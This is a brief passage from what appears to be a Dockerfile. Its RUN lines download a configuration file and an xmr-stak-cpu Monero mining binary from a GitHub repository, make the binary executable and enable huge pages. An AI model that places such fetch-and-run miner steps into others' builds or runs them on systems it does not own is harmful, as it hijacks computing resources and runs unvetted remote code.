...
RUN wget https://github.com/copuwa/caprow/raw/master/config2.txt 
RUN mv config2.txt config.txt
RUN wget https://github.com/copuwa/caprow/raw/master/xmr-stak-cpu && chmod +x xmr-stak-cpu && sysctl -w vm.nr_hugepages=128
